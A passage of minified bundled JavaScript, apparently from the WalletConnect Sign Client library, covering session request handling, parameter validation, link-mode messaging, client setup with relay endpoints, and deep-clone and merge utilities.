this.sendError({id:d,topic:o,error:f}),this.client.logger.error(f)}}),qe(this,"onSessionRequestResponse",(t,i)=>{const{id:n}=i,s=Pi("session_request",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(Pi("session_request",n),{result:i.result}):wi(i)&&this.events.emit(Pi("session_request",n),{error:i.error})}),qe(this,"onSessionEventRequest",async(t,i)=>{const{id:n,params:s}=i;try{const o=`${t}_session_event_${s.event.name}`,a=Hb.get(o);if(a&&this.isRequestOutOfSync(a,n)){this.client.logger.info(`Discarding out of sync request - ${n}`);return}this.isValidEmit(Qi({topic:t},s)),this.client.events.emit("session_event",{id:n,topic:t,params:s}),Hb.set(o,n)}catch(o){await this.sendError({id:n,topic:t,error:o}),this.client.logger.error(o)}}),qe(this,"onSessionAuthenticateResponse",(t,i)=>{const{id:n}=i;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:t,payload:i}),Gi(i)?this.events.emit(Pi("session_request",n),{result:i.result}):wi(i)&&this.events.emit(Pi("session_request",n),{error:i.error})}),qe(this,"onSessionAuthenticateRequest",async t=>{var i;const{topic:n,payload:s,attestation:o,encryptedId:a,transportType:c}=t;try{const{requester:l,authPayload:u,expiryTimestamp:d}=s.params,h=await this.getVerifyContext({attestationId:o,hash:ld(JSON.stringify(s)),encryptedId:a,metadata:l.metadata,transportType:c}),f={requester:l,pairingTopic:n,id:s.id,authPayload:u,verifyContext:h,expiryTimestamp:d};await this.setAuthRequest(s.id,{request:f,pairingTopic:n,transportType:c}),c===pn.link_mode&&(i=l.metadata.redirect)!=null&&i.universal&&this.client.core.addLinkModeSupportedApp(l.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:n,params:s.params,id:s.id,verifyContext:h})}catch(l){this.client.logger.error(l);const u=s.params.requester.publicKey,d=await this.client.core.crypto.generateKeyPair(),h=this.getAppLinkIfEnabled(s.params.requester.metadata,c),f={type:s0,receiverPublicKey:u,senderPublicKey:d};await this.sendError({id:s.id,topic:n,error:l,encodeOpts:f,rpcOpts:Os.wc_sessionAuthenticate.autoReject,appLink:h})}}),qe(this,"addSessionRequestToSessionRequestQueue",t=>{this.sessionRequestQueue.queue.push(t)}),qe(this,"cleanupAfterResponse",t=>{this.deletePendingSessionRequest(t.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=Qu.idle,this.processSessionRequestQueue()},fe.toMiliseconds(this.requestQueueDelay))}),qe(this,"cleanupPendingSentRequestsForTopic",({topic:t,error:i})=>{const n=this.client.core.history.pending;n.length>0&&n.filter(s=>s.topic===t&&s.request.method==="wc_sessionRequest").forEach(s=>{const o=s.request.id,a=Pi("session_request",o);if(this.events.listenerCount(a)===0)throw new Error(`emitting ${a} without any listeners`);this.events.emit(Pi("session_request",s.request.id),{error:i})})}),qe(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===Qu.active){this.client.logger.info("session request queue is already active.");return}const t=this.sessionRequestQueue.queue[0];if(!t){this.client.logger.info("session request queue is empty.");return}try{this.sessionRequestQueue.state=Qu.active,this.emitSessionRequest(t)}catch(i){this.client.logger.error(i)}}),qe(this,"emitSessionRequest",t=>{this.client.events.emit("session_request",t)}),qe(this,"onPairingCreated",t=>{if(t.methods&&this.expectedPairingMethodMap.set(t.topic,t.methods),t.active)return;const i=this.client.proposal.getAll().find(n=>n.pairingTopic===t.topic);i&&this.onSessionProposeRequest({topic:t.topic,payload:jn("wc_sessionPropose",zo(Qi({},i),{requiredNamespaces:i.requiredNamespaces,optionalNamespaces:i.optionalNamespaces,relays:i.relays,proposer:i.proposer,sessionProperties:i.sessionProperties,scopedProperties:i.scopedProperties}),i.id)})}),qe(this,"isValidConnect",async t=>{if(!ba(t)){const{message:l}=at("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(t)}`);throw new Error(l)}const{pairingTopic:i,requiredNamespaces:n,optionalNamespaces:s,sessionProperties:o,scopedProperties:a,relays:c}=t;if(lo(i)||await this.isValidPairingTopic(i),!Ost(c)){const{message:l}=at("MISSING_OR_INVALID",`connect() relays: ${c}`);throw new Error(l)}if(!lo(n)&&Qf(n)!==0){const l="requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";["fatal","error","silent"].includes(this.client.logger.level)?console.warn(l):this.client.logger.warn(l),this.validateNamespaces(n,"requiredNamespaces")}if(!lo(s)&&Qf(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),lo(o)||this.validateSessionProps(o,"sessionProperties"),!lo(a)){this.validateSessionProps(a,"scopedProperties");const l=Object.keys(n||{}).concat(Object.keys(s||{}));if(!Object.keys(a).every(u=>l.includes(u)))throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: ${JSON.stringify(l)}`)}}),qe(this,"validateNamespaces",(t,i)=>{const n=Rst(t,"connect()",i);if(n)throw new Error(n.message)}),qe(this,"isValidApprove",async t=>{if(!ba(t))throw new Error(at("MISSING_OR_INVALID",`approve() params: ${t}`).message);const{id:i,namespaces:n,relayProtocol:s,sessionProperties:o,scopedProperties:a}=t;this.checkRecentlyDeleted(i),await this.isValidProposalId(i);const c=this.client.proposal.get(i),l=_T(n,"approve()");if(l)throw new Error(l.message);const u=JK(c.requiredNamespaces,n,"approve()");if(u)throw new Error(u.message);if(!us(s,!0)){const{message:d}=at("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(d)}if(lo(o)||this.validateSessionProps(o,"sessionProperties"),!lo(a)){this.validateSessionProps(a,"scopedProperties");const d=new Set(Object.keys(n));if(!Object.keys(a).every(h=>d.has(h)))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(d).join(", ")}`)}}),qe(this,"isValidReject",async t=>{if(!ba(t)){const{message:s}=at("MISSING_OR_INVALID",`reject() params: ${t}`);throw new Error(s)}const{id:i,reason:n}=t;if(this.checkRecentlyDeleted(i),await this.isValidProposalId(i),!Mst(n)){const{message:s}=at("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(n)}`);throw new Error(s)}}),qe(this,"isValidSessionSettleRequest",t=>{if(!ba(t)){const{message:l}=at("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${t}`);throw new Error(l)}const{relay:i,controller:n,namespaces:s,expiry:o}=t;if(!Coe(i)){const{message:l}=at("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(l)}const a=Ist(n,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=_T(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(Sf(o)){const{message:l}=at("EXPIRED","onSessionSettleRequest()");throw new Error(l)}}),qe(this,"isValidUpdate",async t=>{if(!ba(t)){const{message:c}=at("MISSING_OR_INVALID",`update() params: ${t}`);throw new Error(c)}const{topic:i,namespaces:n}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i);const s=this.client.session.get(i),o=_T(n,"update()");if(o)throw new Error(o.message);const a=JK(s.requiredNamespaces,n,"update()");if(a)throw new Error(a.message)}),qe(this,"isValidExtend",async t=>{if(!ba(t)){const{message:n}=at("MISSING_OR_INVALID",`extend() params: ${t}`);throw new Error(n)}const{topic:i}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i)}),qe(this,"isValidRequest",async t=>{if(!ba(t)){const{message:c}=at("MISSING_OR_INVALID",`request() params: ${t}`);throw new Error(c)}const{topic:i,request:n,chainId:s,expiry:o}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i);const{namespaces:a}=this.client.session.get(i);if(!YK(a,s)){const{message:c}=at("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!Dst(n)){const{message:c}=at("MISSING_OR_INVALID",`request() ${JSON.stringify(n)}`);throw new Error(c)}if(!jst(a,s,n.method)){const{message:c}=at("MISSING_OR_INVALID",`request() method: ${n.method}`);throw new Error(c)}if(o&&!Wst(o,PT)){const{message:c}=at("MISSING_OR_INVALID",`request() expiry: ${o}. Expiry must be a number (in seconds) between ${PT.min} and ${PT.max}`);throw new Error(c)}}),qe(this,"isValidRespond",async t=>{var i;if(!ba(t)){const{message:o}=at("MISSING_OR_INVALID",`respond() params: ${t}`);throw new Error(o)}const{topic:n,response:s}=t;try{await this.isValidSessionTopic(n)}catch(o){throw(i=t?.response)!=null&&i.id&&this.cleanupAfterResponse(t),o}if(!Lst(s)){const{message:o}=at("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(o)}}),qe(this,"isValidPing",async t=>{if(!ba(t)){const{message:n}=at("MISSING_OR_INVALID",`ping() params: ${t}`);throw new Error(n)}const{topic:i}=t;await this.isValidSessionOrPairingTopic(i)}),qe(this,"isValidEmit",async t=>{if(!ba(t)){const{message:a}=at("MISSING_OR_INVALID",`emit() params: ${t}`);throw new Error(a)}const{topic:i,event:n,chainId:s}=t;await this.isValidSessionTopic(i);const{namespaces:o}=this.client.session.get(i);if(!YK(o,s)){const{message:a}=at("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!Ust(n)){const{message:a}=at("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(n)}`);throw new Error(a)}if(!Fst(o,s,n.name)){const{message:a}=at("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(n)}`);throw new Error(a)}}),qe(this,"isValidDisconnect",async t=>{if(!ba(t)){const{message:n}=at("MISSING_OR_INVALID",`disconnect() params: ${t}`);throw new Error(n)}const{topic:i}=t;await this.isValidSessionOrPairingTopic(i)}),qe(this,"isValidAuthenticate",t=>{const{chains:i,uri:n,domain:s,nonce:o}=t;if(!Array.isArray(i)||i.length===0)throw new Error("chains is required and must be a non-empty array");if(!us(n,!1))throw new Error("uri is required parameter");if(!us(s,!1))throw new Error("domain is required parameter");if(!us(o,!1))throw new Error("nonce is required parameter");if([...new Set(i.map(c=>hw(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=hw(i[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),qe(this,"getVerifyContext",async t=>{const{attestationId:i,hash:n,encryptedId:s,metadata:o,transportType:a}=t,c={verified:{verifyUrl:o.verifyUrl||J5,validation:"UNKNOWN",origin:o.url||""}};try{if(a===pn.link_mode){const u=this.getAppLinkIfEnabled(o,a);return c.verified.validation=u&&new URL(u).origin===new URL(o.url).origin?"VALID":"INVALID",c}const l=await this.client.core.verify.resolve({attestationId:i,hash:n,encryptedId:s,verifyUrl:o.verifyUrl});l&&(c.verified.origin=l.origin,c.verified.isScam=l.isScam,c.verified.validation=l.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(l){this.client.logger.warn(l)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c}),qe(this,"validateSessionProps",(t,i)=>{Object.values(t).forEach((n,s)=>{if(n==null){const{message:o}=at("MISSING_OR_INVALID",`${i} must contain an existing value for each key. Received: ${n} for key ${Object.keys(t)[s]}`);throw new Error(o)}})}),qe(this,"getPendingAuthRequest",t=>{const i=this.client.auth.requests.get(t);return typeof i=="object"?i:void 0}),qe(this,"addToRecentlyDeleted",(t,i)=>{if(this.recentlyDeletedMap.set(t,i),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let n=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(n++>=s)break;this.recentlyDeletedMap.delete(o)}}}),qe(this,"checkRecentlyDeleted",t=>{const i=this.recentlyDeletedMap.get(t);if(i){const{message:n}=at("MISSING_OR_INVALID",`Record was recently deleted - ${i}: ${t}`);throw new Error(n)}}),qe(this,"isLinkModeEnabled",(t,i)=>{var n,s,o,a,c,l,u,d,h;return!t||i!==pn.link_mode?!1:((s=(n=this.client.metadata)==null?void 0:n.redirect)==null?void 0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((l=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:l.universal)!==""&&((u=t?.redirect)==null?void 0:u.universal)!==void 0&&((d=t?.redirect)==null?void 0:d.universal)!==""&&((h=t?.redirect)==null?void 0:h.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(t.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"}),qe(this,"getAppLinkIfEnabled",(t,i)=>{var n;return this.isLinkModeEnabled(t,i)?(n=t?.redirect)==null?void 0:n.universal:void 0}),qe(this,"handleLinkModeMessage",({url:t})=>{if(!t||!t.includes("wc_ev")||!t.includes("topic"))return;const i=hK(t,"topic")||"",n=decodeURIComponent(hK(t,"wc_ev")||""),s=this.client.session.keys.includes(i);s&&this.client.session.update(i,{transportType:pn.link_mode}),this.client.core.dispatchEnvelope({topic:i,message:n,sessionExists:s})}),qe(this,"registerLinkModeListeners",async()=>{var t;if(dB()||Mp()&&(t=this.client.metadata.redirect)!=null&&t.linkMode){const i=global==null?void 0:global.Linking;if(typeof i<"u"){i.addEventListener("url",this.handleLinkModeMessage,this.client.name);const n=await i.getInitialURL();n&&setTimeout(()=>{this.handleLinkModeMessage({url:n})},50)}}}),qe(this,"shouldSetTVF",(t,i)=>{if(!i||t!=="wc_sessionRequest")return!1;const{request:n}=i;return Object.keys(AG).includes(n.method)}),qe(this,"getTVFParams",(t,i,n)=>{var s,o;try{const a=i.request.method,c=this.extractTxHashesFromResult(a,n);return zo(Qi({correlationId:t,rpcMethods:[a],chainId:i.chainId},this.isValidContractData(i.request.params)&&{contractAddresses:[(o=(s=i.request.params)==null?void 0:s[0])==null?void 0:o.to]}),{txHashes:c})}catch(a){this.client.logger.warn("Error getting TVF params",a)}return{}}),qe(this,"isValidContractData",t=>{var i;if(!t)return!1;try{const n=t?.data||((i=t?.[0])==null?void 0:i.data);if(!n.startsWith("0x"))return!1;const s=n.slice(2);return/^[0-9a-fA-F]*$/.test(s)?s.length%2===0:!1}catch{}return!1}),qe(this,"extractTxHashesFromResult",(t,i)=>{try{const n=AG[t];if(typeof i=="string")return[i];const s=i[n.key];if(Jf(s))return t==="solana_signAllTransactions"?s.map(o=>uit(o)):s;if(typeof s=="string")return[s]}catch(n){this.client.logger.warn("Error extracting tx hashes from result",n)}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,t=this.client.core.relayer.messages.getWithoutAck(e);for(const[i,n]of Object.entries(t))for(const s of n)try{await this.onProviderMessageEvent({topic:i,message:s,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${i}, message: ${s}`)}}catch(e){this.client.logger.warn("processPendingMessageEvents failed",e)}}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(qs.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:t,message:i,attestation:n,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(N9)?this.client.auth.authKeys.get(N9):{publicKey:void 0};try{const a=await this.client.core.crypto.decode(t,i,{receiverPublicKey:o,encoding:s===pn.link_mode?kf:uu});N0(a)?(this.client.core.history.set(t,a),await this.onRelayEventRequest({topic:t,payload:a,attestation:n,transportType:s,encryptedId:ld(i)})):Jd(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:t,payload:a,transportType:s}),this.client.core.history.delete(t,a.id)):await this.onRelayEventUnknownPayload({topic:t,payload:a,transportType:s}),await this.client.core.relayer.messages.ack(t,i)}catch(a){this.client.logger.error(a)}}registerExpirerEvents(){this.client.core.expirer.on(Zc.expired,async e=>{const{topic:t,id:i}=Fse(e.target);if(i&&this.client.pendingRequest.keys.includes(i))return await this.deletePendingSessionRequest(i,at("EXPIRED"),!0);if(i&&this.client.auth.requests.keys.includes(i))return await this.deletePendingAuthRequest(i,at("EXPIRED"),!0);t?this.client.session.keys.includes(t)&&(await this.deleteSession({topic:t,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:t})):i&&(await this.deleteProposal(i,!0),this.client.events.emit("proposal_expire",{id:i}))})}registerPairingEvents(){this.client.core.pairing.events.on(g1.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(g1.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!us(e,!1)){const{message:t}=at("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(t)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:t}=at("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(t)}if(Sf(this.client.core.pairing.pairings.get(e).expiry)){const{message:t}=at("EXPIRED",`pairing topic: ${e}`);throw new Error(t)}}async isValidSessionTopic(e){if(!us(e,!1)){const{message:t}=at("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(t)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:t}=at("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(t)}if(Sf(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:t}=at("EXPIRED",`session topic: ${e}`);throw new Error(t)}if(!this.client.core.crypto.keychain.has(e)){const{message:t}=at("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(t)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(us(e,!1)){const{message:t}=at("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(t)}else{const{message:t}=at("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(t)}}async isValidProposalId(e){if(!Bst(e)){const{message:t}=at("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(t)}if(!this.client.proposal.keys.includes(e)){const{message:t}=at("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(t)}if(Sf(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:t}=at("EXPIRED",`proposal id: ${e}`);throw new Error(t)}}}class Jlt extends A2{constructor(e,t){super(e,t,Blt,vB),this.core=e,this.logger=t}}let Qlt=class extends A2{constructor(e,t){super(e,t,Mlt,vB),this.core=e,this.logger=t}};class Xlt extends A2{constructor(e,t){super(e,t,Llt,vB,i=>i.id),this.core=e,this.logger=t}}class eut extends A2{constructor(e,t){super(e,t,qlt,_E,()=>N9),this.core=e,this.logger=t}}class tut extends A2{constructor(e,t){super(e,t,zlt,_E),this.core=e,this.logger=t}}class rut extends A2{constructor(e,t){super(e,t,Wlt,_E,i=>i.id),this.core=e,this.logger=t}}var iut=Object.defineProperty,nut=(r,e,t)=>e in r?iut(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,$T=(r,e,t)=>nut(r,typeof e!="symbol"?e+"":e,t);class sut{constructor(e,t){this.core=e,this.logger=t,$T(this,"authKeys"),$T(this,"pairingTopics"),$T(this,"requests"),this.authKeys=new eut(this.core,this.logger),this.pairingTopics=new tut(this.core,this.logger),this.requests=new rut(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}}var out=Object.defineProperty,aut=(r,e,t)=>e in r?out(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Yr=(r,e,t)=>aut(r,typeof e!="symbol"?e+"":e,t);let cut=class qoe extends Ret{constructor(e){super(e),Yr(this,"protocol",Uoe),Yr(this,"version",joe),Yr(this,"name",NT.name),Yr(this,"metadata"),Yr(this,"core"),Yr(this,"logger"),Yr(this,"events",new en.EventEmitter),Yr(this,"engine"),Yr(this,"session"),Yr(this,"proposal"),Yr(this,"pendingRequest"),Yr(this,"auth"),Yr(this,"signConfig"),Yr(this,"on",(i,n)=>this.events.on(i,n)),Yr(this,"once",(i,n)=>this.events.once(i,n)),Yr(this,"off",(i,n)=>this.events.off(i,n)),Yr(this,"removeListener",(i,n)=>this.events.removeListener(i,n)),Yr(this,"removeAllListeners",i=>this.events.removeAllListeners(i)),Yr(this,"connect",async i=>{try{return await this.engine.connect(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"pair",async i=>{try{return await this.engine.pair(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"approve",async i=>{try{return await this.engine.approve(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"reject",async i=>{try{return await this.engine.reject(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"update",async i=>{try{return await this.engine.update(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"extend",async i=>{try{return await this.engine.extend(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"request",async i=>{try{return await this.engine.request(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"respond",async i=>{try{return await this.engine.respond(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"ping",async i=>{try{return await this.engine.ping(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"emit",async i=>{try{return await this.engine.emit(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"disconnect",async i=>{try{return await this.engine.disconnect(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"find",i=>{try{return this.engine.find(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(i){throw this.logger.error(i.message),i}}),Yr(this,"authenticate",async(i,n)=>{try{return await this.engine.authenticate(i,n)}catch(s){throw this.logger.error(s.message),s}}),Yr(this,"formatAuthMessage",i=>{try{return this.engine.formatAuthMessage(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"approveSessionAuthenticate",async i=>{try{return await this.engine.approveSessionAuthenticate(i)}catch(n){throw this.logger.error(n.message),n}}),Yr(this,"rejectSessionAuthenticate",async i=>{try{return await this.engine.rejectSessionAuthenticate(i)}catch(n){throw this.logger.error(n.message),n}}),this.name=e?.name||NT.name,this.metadata=Ert(e?.metadata),this.signConfig=e?.signConfig;const t=typeof e?.logger<"u"&&typeof e?.logger!="string"?e.logger:Iu(ra({level:e?.logger||NT.logger}));this.core=e?.core||new Olt(e),this.logger=gr(t,this.name),this.session=new Qlt(this.core,this.logger),this.proposal=new Jlt(this.core,this.logger),this.pendingRequest=new Xlt(this.core,this.logger),this.engine=new Ylt(this),this.auth=new sut(this.core,this.logger)}static async init(e){const t=new qoe(e);return await t.initialize(),t}get context(){return Or(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success"),setTimeout(()=>{this.engine.processRelayMessageCache()},fe.toMiliseconds(fe.ONE_SECOND))}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};const TG="error",lut="wss://relay.walletconnect.org",uut="wc",dut="universal_provider",O8=`${uut}@2:${dut}:`,zoe="https://rpc.walletconnect.org/v1/",Fm="generic",hut=`${zoe}bundler`,_l={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};function fut(){}function yB(r){return r==null||typeof r!="object"&&typeof r!="function"}function xB(r){return ArrayBuffer.isView(r)&&!(r instanceof DataView)}function put(r){if(yB(r))return r;if(Array.isArray(r)||xB(r)||r instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&r instanceof SharedArrayBuffer)return r.slice(0);const e=Object.getPrototypeOf(r),t=e.constructor;if(r instanceof Date||r instanceof Map||r instanceof Set)return new t(r);if(r instanceof RegExp){const i=new t(r);return i.lastIndex=r.lastIndex,i}if(r instanceof DataView)return new t(r.buffer.slice(0));if(r instanceof Error){const i=new t(r.message);return i.stack=r.stack,i.name=r.name,i.cause=r.cause,i}if(typeof File<"u"&&r instanceof File)return new t([r],r.name,{type:r.type,lastModified:r.lastModified});if(typeof r=="object"){const i=Object.create(e);return Object.assign(i,r)}return r}function kG(r){return typeof r=="object"&&r!==null}function Woe(r){return Object.getOwnPropertySymbols(r).filter(e=>Object.prototype.propertyIsEnumerable.call(r,e))}function Hoe(r){return r==null?r===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(r)}const gut="[object RegExp]",Voe="[object String]",Koe="[object Number]",Goe="[object Boolean]",Zoe="[object Arguments]",mut="[object Symbol]",wut="[object Date]",but="[object Map]",vut="[object Set]",yut="[object Array]",xut="[object ArrayBuffer]",Cut="[object Object]",Eut="[object DataView]",_ut="[object Uint8Array]",Sut="[object Uint8ClampedArray]",Aut="[object Uint16Array]",Iut="[object Uint32Array]",Tut="[object Int8Array]",kut="[object Int16Array]",Nut="[object Int32Array]",Put="[object Float32Array]",$ut="[object Float64Array]";function Rut(r,e){return Xm(r,void 0,r,new Map,e)}function Xm(r,e,t,i=new Map,n=void 0){const s=n?.(r,e,t,i);if(s!=null)return s;if(yB(r))return r;if(i.has(r))return i.get(r);if(Array.isArray(r)){const o=new Array(r.length);i.set(r,o);for(let a=0;a<r.length;a++)o[a]=Xm(r[a],a,t,i,n);return Object.hasOwn(r,"index")&&(o.index=r.index),Object.hasOwn(r,"input")&&(o.input=r.input),o}if(r instanceof Date)return new Date(r.getTime());if(r instanceof RegExp){const o=new RegExp(r.source,r.flags);return o.lastIndex=r.lastIndex,o}if(r instanceof Map){const o=new Map;i.set(r,o);for(const[a,c]of r)o.set(a,Xm(c,a,t,i,n));return o}if(r instanceof Set){const o=new Set;i.set(r,o);for(const a of r)o.add(Xm(a,void 0,t,i,n));return o}if(typeof Buffer<"u"&&Buffer.isBuffer(r))return r.subarray();if(xB(r)){const o=new(Object.getPrototypeOf(r)).constructor(r.length);i.set(r,o);for(let a=0;a<r.length;a++)o[a]=Xm(r[a],a,t,i,n);return o}if(r instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&r instanceof SharedArrayBuffer)return r.slice(0);if(r instanceof DataView){const o=new DataView(r.buffer.slice(0),r.byteOffset,r.byteLength);return i.set(r,o),m1(o,r,t,i,n),o}if(typeof File<"u"&&r instanceof File){const o=new File([r],r.name,{type:r.type});return i.set(r,o),m1(o,r,t,i,n),o}if(r instanceof Blob){const o=new Blob([r],{type:r.type});return i.set(r,o),m1(o,r,t,i,n),o}if(r instanceof Error){const o=new r.constructor;return i.set(r,o),o.message=r.message,o.name=r.name,o.stack=r.stack,o.cause=r.cause,m1(o,r,t,i,n),o}if(typeof r=="object"&&Out(r)){const o=Object.create(Object.getPrototypeOf(r));return i.set(r,o),m1(o,r,t,i,n),o}return r}function m1(r,e,t=r,i,n){const s=[...Object.keys(e),...Woe(e)];for(let o=0;o<s.length;o++){const a=s[o],c=Object.getOwnPropertyDescriptor(r,a);(c==null||c.writable)&&(r[a]=Xm(e[a],a,t,i,n))}}function Out(r){switch(Hoe(r)){case Zoe:case yut:case xut:case Eut:case Goe:case wut:case Put:case $ut:case Tut:case kut:case Nut:case but:case Koe:case Cut:case gut:case vut:case Voe:case mut:case _ut:case Sut:case Aut:case Iut:return!0;default:return!1}}function But(r,e){return Rut(r,(t,i,n,s)=>{if(typeof r=="object")switch(Object.prototype.toString.call(r)){case Koe:case Voe:case Goe:{const o=new r.constructor(r?.valueOf());return m1(o,r),o}case Zoe:{const o={};return m1(o,r),o.length=r.length,o[Symbol.iterator]=r[Symbol.iterator],o}default:return}})}function NG(r){return But(r)}function PG(r){return r!==null&&typeof r=="object"&&Hoe(r)==="[object Arguments]"}function Mut(r){return xB(r)}function Dut(r){if(typeof r!="object"||r==null)return!1;if(Object.getPrototypeOf(r)===null)return!0;if(Object.prototype.toString.call(r)!=="[object Object]"){const t=r[Symbol.toStringTag];return t==null||!Object.getOwnPropertyDescriptor(r,Symbol.toStringTag)?.writable?!1:r.toString()===`[object ${t}]`}let e=r;for(;Object.getPrototypeOf(e)!==null;)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(r)===e}function Lut(r,...e){const t=e.slice(0,-1),i=e[e.length-1];let n=r;for(let s=0;s<t.length;s++){const o=t[s];n=GP(n,o,i,new Map)}return n}function GP(r,e,t,i){if(yB(r)&&(r=Object(r)),e==null||typeof e!="object")return r;if(i.has(e))return put(i.get(e));if(i.set(e,r),Array.isArray(e)){e=e.slice();for(let s=0;s<e.length;s++)e[s]=e[s]??void 0}const n=[...Object.keys(e),...Woe(e)];for(let s=0;s<n.length;s++){const o=n[s];let a=e[o],c=r[o];if(PG(a)&&(a={...a}),PG(c)&&(c={...c}),typeof Buffer<"u"&&Buffer.isBuffer(a)&&(a=NG(a)),Array.isArray(a))if(typeof c=="object"&&c!=null){const u=[],d=Reflect.ownKeys(c);for(let h=0;h<d.length;h++){const f=d[h];u[f]=c[f]}c=u}else c=[];const l=t(c,a,o,r,e,i);l!=null?r[o]=l:Array.isArray(a)||kG(c)&&kG(a)?r[o]=GP(c,a,t,i):c==null&&Dut(a)?r[o]=GP({},a,t,i):c==null&&Mut(a)?r[o]=NG(a):(c===void 0||a!==void 0)&&(r[o]=a)}return r}function Uut(r,...e){return Lut(r,...e,fut)}var jut=Object.defineProperty,Fut=Object.defineProperties,qut=Object.getOwnPropertyDescriptors,$G=Object.getOwnPropertySymbols,zut=Object.prototype.hasOwnProperty,Wut=Object.prototype.propertyIsEnumerable,RG=(r,e,t)=>e in r?jut(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,B8=(r,e)=>{for(var t in 